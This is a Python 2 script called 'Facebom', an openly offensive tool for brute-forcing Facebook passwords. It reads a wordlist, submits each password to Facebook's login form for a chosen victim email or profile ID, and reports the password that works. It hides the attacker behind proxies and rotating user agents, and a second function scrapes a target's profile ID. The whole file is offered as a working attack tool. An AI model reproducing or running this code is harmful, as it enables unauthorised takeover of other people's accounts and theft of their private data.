#/usr/bin/python
# -*- coding: utf-8 -*-
#I Love Python(^-^)
try:
 ##--------------------- Import Libraries --------------------##
 import socket,time,os,optparse,mechanize,random,re,requests  ##
 ##-----------------------------------------------------------##
except ImportError,e:
        e = e[0][16:]
	print("[\n[*] Please Install it Using this command> [ pip install "+e+" ]")
	exit(1)
os.system("cls||clear")

## COLORS ###############
wi="\033[1;37m" #>>White#
rd="\033[1;31m" #>Red   #
gr="\033[1;32m" #>Green #
yl="\033[1;33m" #>Yallow#
#########################

################## check internet #################
def cnet():                                       #
   try:                                           #
      s = socket.gethostbyname("www.google.com")  #
      ss = socket.create_connection((s, 80), 2)   #
      return True                                 #
   except:                                        #
         pass                                     #
   return False                                   #
                                                  #
###################################################

#### Check Proxy ####
def cpro(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.settimeout(5)
        s.connect((ip, 80))
        s.close()
        return True
    except socket.error:
        pass
    return False

#### Choice Random User-Agent ####
def useragent():
    useragents = [
           'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
           'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
           'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
           'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
           'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
           'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']
    return random.choice(useragents)

#### Get Target Profile ID ####
def ID(url):
    try:
        idre = re.compile('"entity_id":"([0-9]+)"')
        con = requests.get(url).content
        idis = idre.findall(con)
        print(gr+"\n["+wi+"*"+gr+"] Target Profile"+wi+" ID: "+yl+idis[0]+wi)
    except IndexError:
        print(rd+"\n["+yl+"!"+rd+"] Error:"+yl+" Please Check Your Victem Profile URL "+rd+"!!!"+wi)
        exit(1)

#### Facebom Brute Force Function ####
def FBOM(username, wordlist, proxy=None):
    
    if cnet() !=True:
        print(rd+"\n["+yl+""+yl+" Please Check Your Intenrnet Connection "+rd+"!!!"+wi)
        exit(1)
    try:
        test = open(wordlist, "r")
        test.close()
    except IOError:
        print(rd+"\n["+yl+""+yl+" No Such File: [ "+rd+str(wordlist)+yl+" ] "+rd+"!!!"+wi)
        exit(1)
    if proxy !=None: 
        if ":" not in proxy:
            if proxy.count(".") ==3:
                if cpro(proxy) == True:
                    useproxy = proxy+":80"
                else:
                    useproxy = False
                    print(rd+"\n["+yl+""+yl+" Invalid Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
                    exit(1)
            else:
                useproxy = False
                print(rd+"\n["+yl+""+yl+" Invalid Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
                exit(1)
        else:
            proxy = proxy.split(":")[0]
            if proxy.count(".") ==3:
                if cpor(proxy) == True:
                    useproxy = proxy+":80"
                else:
                    useproxy = False
                    print(rd+"\n["+yl+""+yl+" Invalid Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
                    exit(1)
            else:
                useproxy = False
                print(rd+"\n["+yl+""+yl+" Invalid Proxy["+rd+str(proxy)+yl+"] "+rd+"!!!"+wi)
                exit(1)
    else:
        useproxy = False
        
    if useproxy !=False: 
        proxystatus = useproxy+wi+"["+gr+"ON"+wi+"]"
    else:
        proxystatus = yl+"["+rd+"OFF"+yl+"]"
    print(gr+"""
==================================
[---]        """+wi+"""Facebom"""+gr+"""         [---]
==================================
[---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
==================================
[---]         """+wi+"""CONFIG"""+gr+"""         [---]
==================================
[>] Target      :> """+wi+username+gr+"""
[>] Wordlist    :> """+yl+str(wordlist)+gr+"""
[>] ProxyStatus :> """+str(proxystatus)+gr+"""      
================================="""+wi+"""
[~] """+yl+"""Brute"""+rd+"""ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
=================================
""")
    loop = 1
    br=mechanize.Browser()
    br.set_handle_robots(False)
    if useproxy !=False:
        br.set_proxies({'http':useproxy})
    wfile = open(wordlist, "r")
    user_agent = useragent()
    for passwd in wfile:
        if not passwd.strip():continue
        passwd = passwd.strip()
        try:
            print(wi+"["+yl+str(loop)+wi+"]~["+yl+"~"+wi+"] Trying Password:>[ "+yl+str(passwd)+wi)
            br.addheaders=[('User-agent',user_agent)]
            br.open("https://facebook.com")
            br._factory.is_html = True
            br.select_form(nr=0)
            br.form["email"]=username
            br.form["pass"]=passwd
            br.method="POST"
            res = br.submit().get_data()
            if "home_icon" in res:
                print(wi+"==> Login"+gr+" Success\n")
                print(wi+"========================="+"="*len(passwd))
                print(wi+"["+gr+"+"+wi+"] Password "+gr+"Found:"+wi+">>>>[ "+gr+"{}".format(passwd))
                print(wi+"========================="+"="*len(passwd))
                break
            else:
                print(yl+"==> Login"+rd+" Failed\n")
            loop+=1
        except KeyboardInterrupt:
            print(rd+"\n["+yl+"!"+rd+"][CTRL+C]..."+yl+"Exting"+wi)
            time.sleep(1.5)
            wfile.close()
            exit(1)
        except EOFError:
            print(rd+"\n["+yl+"!"+rd+"][CTRL+C]..."+yl+"Exting"+wi)
            time.sleep(1.5)
            wfile.close()
            exit(1)
        except Exception, e:
            print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+e+wi)
            wfile.close()
            exit(1)
            
parse = optparse.OptionParser(wi+"""
Usage: python ./facebom.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------    
    | -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
    |--------
    | -w <wordlist Path>                      ::> Specify Wordlist File Path
    |--------
    | -p <ProxyIP>                            ::> Specify HTTP Proxy (Optional)
    |--------
    | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
-------------
Examples:
        |
     |--------
     | python facebom.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
     |--------
     | python Facebom.py -t 100001013078780 -w C:\Users\Me\Desktop\wordlist.txt
     |--------
     | python facebom.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 
     |-------- 
     | python facebom.py -g https://www.facebook.com/alanwalker97 
     |-------- 
""")

def Main():
   parse.add_option("-t","--target",'-T','--TARGET',dest="taremail",type="string",
			help="Specify Target Email ")
   parse.add_option("-w","--wordlist",'-W','--WORDLIST',dest="wlst",type="string",
			help="Specify Wordlist File ")
   parse.add_option("-p","-P","--proxy","--PROXY",dest="proxy",type="string",
                        help="Specify HTTP Proxy To Be Anonymous When Attack Enable")
   parse.add_option("-g","-G","--getid","--GETID",dest="url",type="string",
                        help="Specify TARGET FACEBOOK PROFILE URL For Get His Id for Use it as his email")
   (options,args) = parse.parse_args()
   if options.taremail !=None and options.wlst !=None and options.proxy !=None:
       username = options.taremail
       wordlist = options.wlst
       proxy = options.proxy
       FBOM(username, wordlist, proxy=proxy)
       
   elif options.taremail !=None and options.wlst !=None:
       username = options.taremail
       wordlist = options.wlst
       FBOM(username, wordlist)  
   elif options.url !=None:
       url = options.url
       ID(url)
   else:
       print(parse.usage)
       exit(1)
       
if __name__=='__main__':
	Main()	
##############################################################
##################### 		     #########################
#####################   END OF TOOL  #########################
#####################                #########################
##############################################################
#This Tool by Oseid Aldary
#Have a nice day :)
#GoodBye
